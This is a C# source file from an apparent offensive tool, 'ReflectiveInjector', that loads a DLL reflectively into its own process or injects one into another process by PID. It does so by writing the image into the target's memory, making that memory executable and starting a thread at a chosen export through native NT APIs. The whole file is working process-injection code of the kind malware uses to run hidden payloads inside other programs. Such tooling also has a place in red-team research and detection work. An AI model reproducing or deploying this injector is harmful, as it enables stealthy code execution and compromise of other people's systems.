using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using ReflectiveInjector.Interop;

namespace ReflectiveInjector.Library
{
    using NTSTATUS = Int32;
    using SIZE_T = UIntPtr;

    internal class Modules
    {
        public static bool LoadReflectiveDll(byte[] dllData, string exportName)
        {
            NTSTATUS ntstatus;
            int error;
            int nExportOffset;
            IntPtr pImageBuffer;
            IntPtr pThreadProc;
            IMAGE_FILE_MACHINE arch;
            bool status = false;
            var nDataSize = (uint)dllData.Length;
            var addressFormat = Environment.Is64BitProcess ? "X16" : "X8";

            if (dllData.Length > 0)
            {
                pImageBuffer = NativeMethods.VirtualAlloc(
                    IntPtr.Zero,
                    new SIZE_T(nDataSize),
                    ALLOCATION_TYPE.COMMIT | ALLOCATION_TYPE.RESERVE,
                    MEMORY_PROTECTION.READWRITE);

                if (pImageBuffer == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to allocate buffer for DLL.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));

                    return false;
                }

                Marshal.Copy(dllData, 0, pImageBuffer, dllData.Length);
                arch = Utilities.GetArchitectureOfImage(pImageBuffer);
            }
            else
            {
                Console.WriteLine("[-] No DLL data is read.");

                return false;
            }

            do
            {
                Console.WriteLine("[>] Trying to search export function offset.");
                Console.WriteLine("    [*] Export Function : {0}", exportName);
                Console.WriteLine("    [*] Architecture    : {0}", arch.ToString());

                if ((arch == IMAGE_FILE_MACHINE.AMD64) && !Environment.Is64BitProcess)
                {
                    Console.WriteLine("[-] For 64bit DLL, must be build as 64bit program.");
                    break;
                }
                else if ((arch == IMAGE_FILE_MACHINE.I386) && Environment.Is64BitProcess)
                {
                    Console.WriteLine("[-] For 32bit DLL, must be build as 32bit program.");
                    break;
                }
                else if (!((arch == IMAGE_FILE_MACHINE.AMD64) || (arch == IMAGE_FILE_MACHINE.I386)))
                {
                    Console.WriteLine("[-] The specified DLL's architecture is unsupported.");
                    break;
                }

                nExportOffset = Utilities.GetProcOffsetFromRawData(pImageBuffer, exportName);

                if (nExportOffset == 0)
                {
                    Console.WriteLine("[-] Failed to find export function.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Offset for {0} is 0x{1}", exportName, nExportOffset.ToString("X"));
                }

                Console.WriteLine("[>] Trying to load reflective DLL to this process.");

                if (Environment.Is64BitProcess)
                    pThreadProc = new IntPtr(pImageBuffer.ToInt64() + nExportOffset);
                else
                    pThreadProc = new IntPtr(pImageBuffer.ToInt32() + nExportOffset);

                Console.WriteLine("    [*] DLL Buffer      @ 0x{0}", pImageBuffer.ToString(addressFormat));
                Console.WriteLine("    [*] Export Function @ 0x{0}", pThreadProc.ToString(addressFormat));

                Console.WriteLine("[>] Making DLL data buffer to readable and executable.");

                ntstatus = NativeMethods.NtProtectVirtualMemory(
                    Process.GetCurrentProcess().Handle,
                    ref pImageBuffer,
                    ref nDataSize,
                    MEMORY_PROTECTION.EXECUTE_READ,
                    out MEMORY_PROTECTION _);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to update memory protection.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Memory protection is updated successfully.");
                }

                Console.WriteLine("[>] Trying to create DLL function thread.");

                ntstatus = NativeMethods.NtCreateThreadEx(
                    out IntPtr hNewThread,
                    ACCESS_MASK.THREAD_ALL_ACCESS,
                    IntPtr.Zero,
                    Process.GetCurrentProcess().Handle,
                    pThreadProc,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to create thread.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
                else
                {
                    Console.WriteLine("[+] DLL function's thread is started successfully.");
                    Console.WriteLine("    [*] Thread Handle : 0x{0}", hNewThread.ToString("X"));
                    NativeMethods.NtWaitForSingleObject(hNewThread, BOOLEAN.TRUE, IntPtr.Zero);
                    NativeMethods.NtClose(hNewThread);
                }
            } while (false);

            Console.WriteLine("[*] Done.");

            return status;
        }


        public static bool ReflectiveDllInjection(int pid, byte[] dllData, string exportName)
        {
            NTSTATUS ntstatus;
            int error;
            string processName;
            int nExportOffset;
            IntPtr pImageBuffer;
            IntPtr pRemoteThread;
            IntPtr pRemoteBuffer;
            IMAGE_FILE_MACHINE arch;
            string addressFormat = Environment.Is64BitProcess ? "X16" : "X8";
            bool status = false;
            IntPtr hProcess = IntPtr.Zero;
            var nRegionSize = new SIZE_T((uint)dllData.Length);

            try
            {
                processName = Process.GetProcessById(pid).ProcessName;
            }
            catch
            {
                Console.WriteLine("[!] The specified PID is not found.");

                return false;
            }

            if (dllData.Length > 0)
            {
                pImageBuffer = Marshal.AllocHGlobal(dllData.Length);
                Marshal.Copy(dllData, 0, pImageBuffer, dllData.Length);
                arch = Utilities.GetArchitectureOfImage(pImageBuffer);
            }
            else
            {
                Console.WriteLine("[-] No DLL data is read.");

                return false;
            }

            do
            {
                Console.WriteLine("[>] Trying to search export function offset.");
                Console.WriteLine("    [*] Export Function : {0}", exportName);
                Console.WriteLine("    [*] Architecture    : {0}", arch.ToString());

                if ((arch == IMAGE_FILE_MACHINE.AMD64) && !Environment.Is64BitProcess)
                {
                    Console.WriteLine("[-] For 64bit DLL, must be build as 64bit program.");
                    break;
                }
                else if ((arch == IMAGE_FILE_MACHINE.I386) && Environment.Is64BitProcess)
                {
                    Console.WriteLine("[-] For 32bit DLL, must be build as 32bit program.");
                    break;
                }
                else if (!((arch == IMAGE_FILE_MACHINE.AMD64) || (arch == IMAGE_FILE_MACHINE.I386)))
                {
                    Console.WriteLine("[-] The specified DLL's architecture is unsupported.");
                    break;
                }

                nExportOffset = Utilities.GetProcOffsetFromRawData(pImageBuffer, exportName);

                if (nExportOffset == 0)
                {
                    Console.WriteLine("[-] Failed to find export function.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Offset for {0} is 0x{1}", exportName, nExportOffset.ToString("X"));
                }

                Console.WriteLine("[>] Trying to open the target process.");
                Console.WriteLine("    [*] Process ID   : {0}", pid);
                Console.WriteLine("    [*] Process Name : {0}", processName);

                hProcess = NativeMethods.OpenProcess(
                    ACCESS_MASK.PROCESS_CREATE_THREAD | ACCESS_MASK.PROCESS_QUERY_INFORMATION | ACCESS_MASK.PROCESS_VM_OPERATION | ACCESS_MASK.PROCESS_VM_WRITE,
                    false,
                    pid);

                if (hProcess == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to open the target process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a target process handle.");
                    Console.WriteLine("    [*] Process Handle : 0x{0}", hProcess.ToString("X"));

                    if (Environment.Is64BitOperatingSystem)
                    {
                        NativeMethods.IsWow64Process(hProcess, out bool isWow64);

                        if (!isWow64 && !Environment.Is64BitProcess)
                        {
                            Console.WriteLine("[-] To inject 64bit process, must be built as 64bit program");
                            break;
                        }
                        else if (isWow64 && Environment.Is64BitProcess)
                        {
                            Console.WriteLine("[-] To inject 32bit process, must be built as 32bit program");
                            break;
                        }
                    }
                }

                Console.WriteLine("[>] Trying to allocate DLL memory to the target process.");

                pRemoteBuffer = NativeMethods.VirtualAllocEx(
                    hProcess,
                    IntPtr.Zero,
                    nRegionSize,
                    ALLOCATION_TYPE.COMMIT | ALLOCATION_TYPE.RESERVE,
                    MEMORY_PROTECTION.READWRITE);

                if (pRemoteBuffer == IntPtr.Zero)
                {
                    ntstatus = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to allocate memory to the target process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, false));
                    break;
                }
                else
                {
                    if (Environment.Is64BitProcess)
                        pRemoteThread = new IntPtr(pRemoteBuffer.ToInt64() + nExportOffset);
                    else
                        pRemoteThread = new IntPtr(pRemoteBuffer.ToInt32() + (int)nExportOffset);

                    Console.WriteLine("[+] Allocated {0} bytes memory to the target process.", nRegionSize);
                    Console.WriteLine("    [*] DLL Buffer      @ 0x{0}", pRemoteBuffer.ToString(addressFormat));
                    Console.WriteLine("    [*] Export Function @ 0x{0}", pRemoteThread.ToString(addressFormat));
                }

                Console.WriteLine("[>] Trying to write {0} bytes DLL data to the target process.", dllData.Length);

                ntstatus = NativeMethods.NtWriteVirtualMemory(
                    hProcess,
                    pRemoteBuffer,
                    dllData,
                    (uint)dllData.Length,
                    out uint nWrittenBytes);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to write DLL data to the target process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] {0} bytes DLL data is written in the target process.", nWrittenBytes);
                }

                Console.WriteLine("[>] Making DLL data buffer to readable and executable.");

                ntstatus = NativeMethods.NtProtectVirtualMemory(
                    hProcess,
                    ref pRemoteBuffer,
                    ref nWrittenBytes,
                    MEMORY_PROTECTION.EXECUTE_READ,
                    out MEMORY_PROTECTION _);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to update memory protection.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Memory protection is updated successfully.");
                }

                Console.WriteLine("[>] Trying to create DLL function thread.");

                ntstatus = NativeMethods.NtCreateThreadEx(
                    out IntPtr hNewThread,
                    ACCESS_MASK.THREAD_ALL_ACCESS,
                    IntPtr.Zero,
                    hProcess,
                    pRemoteThread,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to create thread.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
                else
                {
                    Console.WriteLine("[+] DLL function's thread is started successfully.");
                    Console.WriteLine("    [*] Thread Handle : 0x{0}", hNewThread.ToString("X"));
                    NativeMethods.NtClose(hNewThread);
                }
            } while (false);

            if (hProcess != IntPtr.Zero)
                NativeMethods.NtClose(hProcess);

            Marshal.FreeHGlobal(pImageBuffer);

            Console.WriteLine("[*] Done.");

            return status;
        }
    }
}
